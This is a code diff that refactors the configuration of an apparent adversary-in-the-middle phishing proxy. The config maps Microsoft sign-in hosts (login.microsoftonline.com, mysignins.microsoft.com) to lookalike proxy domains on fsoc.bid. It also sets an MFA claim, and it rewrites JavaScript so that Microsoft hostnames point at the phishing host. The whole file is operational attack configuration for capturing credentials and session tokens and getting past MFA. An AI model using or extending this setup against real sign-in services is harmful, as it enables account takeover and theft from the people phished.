@@ -2,51 +2,26 @@
 AiTM Config
 """
 
-from typing import Literal, TypedDict
+from aitm.helpers.config import Config
 
+config = Config(
+    mfa_claim='{"id_token":{"amr":{"essential":true,"values":["mfa"]}},"access_token":{"amr":{"essential":true,"values":["mfa"]}}}',
+    auth_url=["/kmsi"],
+    local_upstream_hostname="local.upstream.host",
+)
 
-class Target(TypedDict):
-    """
-    Target class
-    """
-
-    origin: str
-    proxy: str
-    port: int
-
-
-class Modification(TypedDict):
-    """
-    Modification Class
-    """
-
-    mimes: list[str]
-    sites: list[str]
-    search: str
-    replace: str
-
-
-TARGETS: list[Target] = [
+config.targets = [
     {"origin": "mysignins.microsoft.com", "proxy": "mysignins.fsoc.bid", "port": 6000},
     {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001}
 ]
-
-CONTENT_TYPES: list[str] = [
+config.content_types = [
     "text/html",
     "application/json",
     "application/javascript",
     "application/x-javascript",
 ]
 
-AUTH_URL: list[str] = ["/kmsi"]
-MFA_CLAIM = '{"id_token":{"amr":{"essential":true,"values":["mfa"]}},"access_token":{"amr":{"essential":true,"values":["mfa"]}}}'
-
-LOCAL_UPSTREAM_SCHEME: Literal[
-    "http", "https", "http3", "tls", "dtls", "tcp", "udp", "dns", "quic"
-] = "http"
-LOCAL_UPSTREAM_HOSTNAME = "local.upstream.host"
-
-CUSTOM_MODIFICATIONS: list[Modification] = [
+config.custom_modifications = [
     {
         "mimes": ["application/javascript", "application/x-javascript"],
         "sites": ["mysignins.microsoft.com"],
@@ -54,6 +29,3 @@ CUSTOM_MODIFICATIONS: list[Modification] = [
         "replace": "login.fsoc.bid",
     }
 ]
-
-TARGET_SITES = [target["origin"] for target in TARGETS]
-TARGET_PROXIES = [target["proxy"] for target in TARGETS]
